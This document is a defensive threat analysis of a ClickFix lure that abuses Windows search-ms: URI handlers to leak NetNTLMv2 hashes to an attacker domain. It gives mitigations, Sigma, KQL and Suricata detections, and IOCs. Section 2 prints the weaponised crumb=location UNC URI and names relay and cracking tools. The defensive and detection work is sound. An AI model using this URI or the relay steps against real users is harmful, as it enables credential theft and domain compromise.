# ClickFix + `search-ms:` NTLM Leak — Technique Analysis, Defence & Detection

**Classification:** TLP:CLEAR (contains only publicly documented tradecraft + defensive content)
**Date:** 2026-08-09
**Observed IOC in this case:** `xyzblue.dpdns[.]org` (attacker WebDAV/SMB listener + HTML lure host)
**Technique family:** Forced authentication / NTLM credential coercion via protocol-handler abuse
**MITRE ATT&CK:** T1187 (Forced Authentication), T1204.001 (User Execution: Malicious Link), T1557.001 (AiTM: LLMNR/NBT-NS/NTLM relay), T1040 (Network Sniffing), T1110 (Brute Force / offline crack)

---

## 1. Executive summary

The page you observed is a **ClickFix social-engineering lure** wired to a **Windows URI-handler forced-authentication bug**. When the victim interacts with the page, the browser hands a `search:` / `search-ms:` protocol URI to Windows Explorer. That URI contains a `crumb=location:` parameter pointing at a **remote UNC path** (`\\xyzblue.dpdns.org\share`). Windows resolves that path and **automatically performs NTLM authentication to the attacker's server**, transmitting the victim's **NetNTLMv2 hash** with no file download and, in the worst case, a single click.

The attacker then either **cracks the hash offline** (recovering the plaintext password) or **relays it in real time** to an internal service the user can access (SMB, LDAP, AD CS/ESC8, Exchange), pivoting toward privilege escalation or domain compromise.

Two things make this notable in 2026:

- **No patch exists.** Microsoft declined a CVE/fix for the `search:`/`search-ms:` handler variant, citing an "exception-driven" servicing policy, despite the near-identical Snipping Tool variant (CVE-2026-33829) being patched. It is confirmed working on Windows 11 23H2 (22631.6199) and 25H2 (26200.8524). Treat it as a **standing zero-day-class exposure you must compensate for with controls**, not something you can wait to patch away.
- **The target is a hostname, not an IP** (`xyzblue.dpdns.org` — a free DPDNS dynamic-DNS subdomain). That strongly implies the coercion is designed to egress over **WebDAV (HTTP/HTTPS 80/443)** via the **WebClient service**, not raw SMB/445 — because outbound 445 is blocked at most perimeters, but 80/443 is not. This is the internet-viable variant of the attack and is the reason the classic "just block outbound 445" advice is necessary but **not sufficient** here.

---

## 2. The attack chain, step by step

```
                                                   attacker infrastructure
                                                   (xyzblue.dpdns[.]org, same IP)
 ┌──────────┐   1. lure    ┌───────────────┐            │
 │  victim  │ ───────────► │  HTML ClickFix │            │
 │ (browser)│              │     page       │            │
 └────┬─────┘              └───────┬────────┘            │
      │  2. click / paste          │  href/JS =          │
      │     "verify" element       │  search-ms:query=…& │
      │                            │  crumb=location:    │
      │                            │  \\xyzblue…\share   │
      ▼                            ▼                     │
 ┌─────────────────────────────────────────┐            │
 │ 3. Windows shell handles search-ms: URI │            │
 │    (ExplorerFrame.dll → SearchExecute,  │            │
 │     CLSID {90b9bce2-b6db-4fd3-8451-      │            │
 │     35917ea1081b})                      │            │
 └───────────────────┬─────────────────────┘            │
                     │ 4. resolve UNC → MUP/WebClient    │
                     ▼                                   │
 ┌─────────────────────────────────────────┐   5. NTLM  │
 │  WebClient (WebDAV, 80/443) OR           │  NEGOTIATE │
 │  LanmanWorkstation (SMB, 445)            │ ──────────►│  captures
 │  performs NTLM auth to remote host       │  CHALLENGE │  NetNTLMv2
 │                                          │ ◄────────  │  challenge/
 │                                          │  RESPONSE  │  response
 └─────────────────────────────────────────┘ ──────────►│
                                                         ▼
                                          6a. OFFLINE CRACK (hashcat -m 5600)
                                          6b. RELAY (ntlmrelayx → SMB/LDAP/AD CS)
```

**Stage 1 — Delivery (ClickFix).** "ClickFix" is the now-dominant lure pattern: a page mimics a Cloudflare/Google "verify you're human", a "fix this document" error, or a CAPTCHA. Instead of the classic ClickFix outcome (tricking the user into pasting a PowerShell/`mshta` command into Run), this variant only needs the victim to **click a crafted link/button** whose target is a `search:`/`search-ms:` URI. Some builds fire the handler automatically on page interaction.

**Stage 2 — The malicious URI.** The weaponised structure (public, needed here only so you can build detections) is:

```
search:query=<anything>&crumb=location:\\xyzblue.dpdns.org\share
search-ms:query=<anything>&crumb=location:\\xyzblue.dpdns.org\share
```

- `query=` is a cosmetic prefix with no security relevance.
- `crumb=location:` is the payload — it accepts a **UNC path**. Windows treats it as a search scope and tries to *reach* it.
- Both `search:` and `search-ms:` route through the **same COM activation path** (`SearchExecute` in `ExplorerFrame.dll`, CLSID `{90b9bce2-b6db-4fd3-8451-35917ea1081b}`), so blocking one handler and not the other leaves you exposed.

**Stage 3–4 — Coercion.** Resolving the UNC path invokes the **Multiple UNC Provider (MUP)**. If SMB/445 is reachable, `LanmanWorkstation` authenticates over SMB. If not — as here, with a public hostname — the **WebClient service** attempts **WebDAV over HTTP/HTTPS (80/443)**. Either path causes Windows to send an **NTLM NEGOTIATE → CHALLENGE → AUTHENTICATE** exchange automatically, using the logged-on user's domain credentials.

**Stage 5 — Capture.** The attacker's listener (Responder, `impacket-smbserver`, or a rogue WebDAV endpoint) records the **NetNTLMv2 challenge/response**. Nothing is downloaded; the victim sees, at most, an Explorer search window flicker.

**Stage 6 — Monetisation.**
- **Offline crack:** `hashcat -m 5600` against the NetNTLMv2. Weak/reused passwords fall in minutes to hours.
- **Relay (more dangerous):** the captured auth is relayed live with `ntlmrelayx` to any service that doesn't enforce signing/EPA — SMB (lateral movement, secretsdump), LDAP/LDAPS (RBCD, shadow-credentials), **AD CS web enrolment (ESC8 → certificate → DA)**, or Exchange. Relay needs no cracking and can escalate straight to domain compromise.

---

## 3. Why it works (root causes you can actually target)

1. **Protocol handlers are registered and reachable from the browser.** `search:`/`search-ms:` are default-registered shell handlers. Chromium/Edge will prompt or, depending on config, launch them.
2. **UNC resolution auto-authenticates.** Windows sends NTLM to *any* host it's asked to reach over SMB/WebDAV — there is no "is this host trusted?" gate. This is by-design NTLM behaviour, which is why it keeps resurfacing (`.lnk`, `.url`, `.library-ms`, `.searchConnector-ms`, Office docs, now `search-ms:`).
3. **The WebClient service turns a LAN bug into an internet bug.** WebDAV lets the coercion ride 80/443 to a public hostname, defeating the "block outbound 445" perimeter assumption.
4. **NTLM relay is still viable** wherever SMB signing, LDAP signing, or EPA are not enforced — which, in most estates, is somewhere.
5. **No vendor patch** for this specific handler, so the fix must be configuration/detection, owned by you.

---

## 4. Defence — layered controls (priority-ordered)

Deploy defence-in-depth; no single item is sufficient. Ordered by impact-to-effort.

### Tier 1 — Kill the egress and the coercion transport
- **Block outbound SMB at the perimeter:** deny **TCP/445 and TCP/139** egress to the internet (firewall + Windows Firewall outbound rule). Highest-value single control for the SMB path.
- **Neutralise WebDAV egress (critical for the hostname variant):** set the **WebClient service** to **Disabled** on all endpoints that don't need it (the vast majority). This removes the HTTP/HTTPS-over-WebDAV coercion path entirely.
  - GPO / MDM: Services → `WebClient` → Startup type **Disabled**.
  - Also block outbound WebDAV at the proxy: deny HTTP methods `PROPFIND`/`OPTIONS` to untrusted hosts and block the `Microsoft-WebDAV-MiniRedir` User-Agent egressing.

### Tier 2 — Break the delivery
- **Disable/redirect the `search:` and `search-ms:` protocol handlers** where there's no business need. Remove/repoint the `HKCR\search` and `HKCR\search-ms` `shell\open\command` handlers, or use an application-control policy so the browser can't launch them. Test — some enterprise search integrations use `search-ms:`.
- **Attack Surface Reduction (Defender ASR):** enable *Block executable content from email client and webmail*, *Block Office/other processes from creating child processes*, and *Block credential stealing from LSASS*. ASR won't block the coercion itself but shrinks the ClickFix-to-execution follow-on.
- **Browser policy:** manage external-protocol handlers via `AutoLaunchProtocolsFromOrigins` / block-lists so `search`/`search-ms` require explicit per-site allow.
- **Mail + web filtering:** block/flag `search:` and `search-ms:` URIs in email bodies, attachments, and proxy logs — these have **no legitimate business use inbound** and are a high-fidelity signal.

### Tier 3 — Make a leaked hash worthless
- **Enforce SMB signing** (require, both client and server) — blocks SMB relay.
- **Enforce LDAP signing + LDAP channel binding** — blocks LDAP/LDAPS relay (the ESC8/RBCD paths).
- **Enable Extended Protection for Authentication (EPA)** on AD CS web enrolment, Exchange, and other HTTP auth endpoints — blocks cross-protocol relay to those services.
- **Harden/disable NTLM:** ramp `RestrictSendingNTLMTraffic` toward `2` (audit → deny) with `RestrictReceivingNTLMTraffic`; audit first with `LmCompatibilityLevel = 5`. Long-tail fix but closes the root cause.
- **Enforce strong, non-reused passwords** (defeats offline cracking) and prioritise this for privileged/service accounts. Consider that a leaked service-account hash is the worst case.
- **Network segmentation:** deny workstation-to-workstation and workstation-to-DC SMB except where required, so a relayed session has nowhere useful to go.

### Tier 4 — User + process
- Awareness: this lure looks like a benign "verify/continue" link; the tell is any prompt to open **Windows Explorer Search** from a web page.
- Sinkhole/block the observed infrastructure (see §6) and the whole `*.dpdns.org` dynamic-DNS TLD if you have no legitimate use for it — free dynamic-DNS domains are a common abuse channel.

---

## 5. Detection & alerting

Layered detections so you catch it at delivery, at coercion, and at relay. Tune host paths/IDs to your estate.

### 5.1 Endpoint — WebClient/WebDAV coercion (highest fidelity for the hostname variant)

**Sigma — WebClient service starting on demand (WebDAV coercion attempt):**
```yaml
title: WebDAV WebClient Service Started (possible NTLM coercion)
id: 9f1c1d2e-searchms-webdav-001
status: experimental
description: WebClient service transitions to running, often triggered by UNC/WebDAV coercion via search-ms/.url/.library-ms
logsource:
  product: windows
  service: system
detection:
  svc_start:
    Provider_Name: 'Service Control Manager'
    EventID: 7036
    param1: 'WebClient'
    param2: 'running'
  selection_scm_change:
    EventID: 7040
    param1: 'WebClient'
  condition: svc_start or selection_scm_change
level: medium
falsepositives:
  - Legitimate SharePoint/WebDAV usage on hosts where WebClient is intentionally enabled
```

**Sigma — search-ms/search URI launched via shell/browser child process:**
```yaml
title: Windows Search Protocol Handler Invocation (search-ms NTLM leak)
id: 9f1c1d2e-searchms-handler-002
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_cmd:
    CommandLine|contains:
      - 'search-ms:'
      - 'search:query='
      - 'crumb=location:'
  selection_unc:
    CommandLine|contains: '\\\\'
    CommandLine|contains: 'crumb'
  parent_browser:
    ParentImage|endswith:
      - '\msedge.exe'
      - '\chrome.exe'
      - '\firefox.exe'
      - '\explorer.exe'
  condition: selection_cmd or (selection_unc and parent_browser)
level: high
falsepositives:
  - Enterprise search integrations that legitimately use search-ms:
```

### 5.2 Microsoft Defender for Endpoint / Sentinel (KQL)

**WebClient started + outbound WebDAV to external host shortly after a browser event:**
```kusto
// NTLM coercion via WebDAV (search-ms ClickFix) — WebClient wakes then egresses
let lookback = 1d;
let webclient =
    DeviceEvents
    | where Timestamp > ago(lookback)
    | where ActionType == "ServiceInstalled" or AdditionalFields has "WebClient"
    | project Timestamp, DeviceId, DeviceName;
DeviceNetworkEvents
| where Timestamp > ago(lookback)
| where InitiatingProcessFileName in~ ("svchost.exe","rundll32.exe","explorer.exe")
| where RemotePort in (80,443,445)
| where RemoteUrl has_any ("dpdns.org") or RemoteIPType == "Public"
| where InitiatingProcessCommandLine has_any ("WebClient","DavSetCookie") 
     or RemoteUrl endswith "/share"
| project Timestamp, DeviceName, RemoteIP, RemoteUrl, RemotePort,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

**Direct hunt for the URI / IOC on endpoints:**
```kusto
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any ("search-ms:", "search:query=", "crumb=location:")
   or ProcessCommandLine has "xyzblue.dpdns.org"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessParentFileName
```

**WebDAV User-Agent egress (network signal for the coercion):**
```kusto
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has "dpdns.org" or RemoteIP == "<attacker_ip>"
| where InitiatingProcessFileName =~ "svchost.exe"   // WebClient runs in svchost
| summarize count() by DeviceName, RemoteUrl, RemoteIP, bin(Timestamp, 1h)
```

### 5.3 Network (Zeek / Suricata / proxy)

- **Zeek:** alert on outbound HTTP with `User-Agent: Microsoft-WebDAV-MiniRedir/*` or methods `PROPFIND`/`OPTIONS` to external/public destinations; alert on any SMB (445) egress leaving the perimeter.
- **Suricata (illustrative):**
```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"WebDAV NTLM coercion - MiniRedir UA to external host"; flow:established,to_server; http.user_agent; content:"Microsoft-WebDAV-MiniRedir"; classtype:attempted-recon; sid:9000101; rev:1;)
alert dns $HOME_NET any -> any any (msg:"Suspicious dynamic-DNS lookup dpdns.org"; dns.query; content:"dpdns.org"; nocase; classtype:bad-unknown; sid:9000102; rev:1;)
```
- **DNS/firewall:** alert on any resolution of `xyzblue.dpdns.org` and, more broadly, `*.dpdns.org`; alert on outbound 445/139.

### 5.4 Delivery-side (email / proxy)
- Flag inbound messages and proxied pages containing the literal strings `search-ms:`, `search:query=`, or `crumb=location:`.
- Flag links to `*.dpdns.org` and other free dynamic-DNS TLDs where you have no business relationship.

### 5.5 Relay-side (catch the second stage)
- **Windows Security 4624/4625** logon events with **Authentication Package = NTLM** and **Logon Type 3** on servers where Kerberos should dominate — especially bursts against DCs, AD CS, or Exchange.
- **AD CS:** certificate enrolment (Event 4886/4887) from the machine account of a workstation, or from an unexpected source — classic ESC8 relay tell.
- Deploy **honey/decoy accounts**; any NTLM auth attempt using them is high-signal.

### 5.6 Targeted alert for THIS incident (deploy now)
Create high-severity alerts on: (1) DNS resolution of `xyzblue.dpdns.org`, (2) any endpoint process command line containing `xyzblue.dpdns.org`, `search-ms:` + `crumb=location:`, (3) `WebClient` service starting on hosts where it's meant to be disabled, and (4) outbound 445 or `Microsoft-WebDAV-MiniRedir` egress. Correlate 1–4 within a 5-minute window per host for a single, high-confidence "search-ms NTLM coercion" alert.

---

## 6. If it has already triggered — response

1. **Scope:** hunt §5.2 across all endpoints for the URI/IOC and WebClient egress; identify which users/hosts reached `xyzblue.dpdns.org`.
2. **Assume credential exposure** for every user whose host authenticated. **Force password reset** for those accounts (and any privileged/service account among them) — the hash is either cracked or relayable.
3. **Check for relay success:** review DC/AD CS/Exchange for anomalous NTLM logons, new certificate enrolments (ESC8), RBCD/shadow-credential changes, and new/lateral SMB sessions from the affected hosts in the exposure window.
4. **Contain infrastructure:** sinkhole/block `xyzblue.dpdns.org` + the shared IP + `*.dpdns.org`; pull the HTML lure sample for analysis.
5. **Remediate root cause:** push Tier 1–3 controls (WebClient disable, 445 egress block, SMB/LDAP signing, EPA) if not already enforced.
6. **Preserve evidence:** capture proxy/DNS/EDR logs and the lure page for IR/threat-intel; enrich and share the IOCs.

---

## 7. Key IOCs & hunting strings

| Type | Value | Notes |
|---|---|---|
| Domain | `xyzblue.dpdns[.]org` | Lure host + WebDAV/SMB coercion target |
| TLD pattern | `*.dpdns[.]org` | Free dynamic-DNS; block if no business use |
| URI | `search-ms:...crumb=location:\\...` | Handler abuse; no inbound business use |
| URI | `search:query=...crumb=location:\\...` | Same COM path, alternate scheme |
| Service | `WebClient` starting unexpectedly | WebDAV coercion enabler |
| Network | `User-Agent: Microsoft-WebDAV-MiniRedir` to external host | HTTP coercion egress |
| Network | Outbound TCP 445/139 to internet | SMB coercion egress |
| COM | CLSID `{90b9bce2-b6db-4fd3-8451-35917ea1081b}`, `ExplorerFrame.dll!SearchExecute` | Shared handler internals |

---

## Sources
- Huntress — *Unpatched NTLM Leakage in Windows `search:` URI Handler*: https://www.huntress.com/blog/unpatched-ntlm-leak-windows-search-uri-handler
- The Hacker News — *Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes*: https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
- GBHackers — *Windows Search URI Handler Vulnerability Exposes NTLMv2 Hashes*: https://gbhackers.com/windows-search-uri-handler-vulnerability/
- Securelist (Kaspersky) — *How NTLM is being abused in 2025 cyberattacks*: https://securelist.com/ntlm-abuse-in-2025/118132/
- Securelist — *CVE-2023-23397 forced-authentication analysis*: https://securelist.com/analysis-of-attack-samples-exploiting-cve-2023-23397/110202/
- HackTricks — *Places to steal NTLM creds*: https://hacktricks.wiki/en/windows-hardening/ntlm/places-to-steal-ntlm-creds.html
- ManageEngine — *How to detect NTLM relay and coercion attacks*: https://www.manageengine.com/log-management/siem-use-cases/threats/ntlm-relay-detection.html
- Lyrie Research — *NTLM Relay in 2026: Defensive Playbook*: https://lyrie.ai/research/research/ntlm-relay-2026-defensive-playbook
- Jay Pomal — *ClickFix to WebDAV: Rundll32-Based Multi-Stage Delivery Chain*: https://jaypomal.medium.com/clickfix-to-webdav-detailed-analysis-of-a-rundll32-based-multi-stage-malware-delivery-chain-7a936354282a
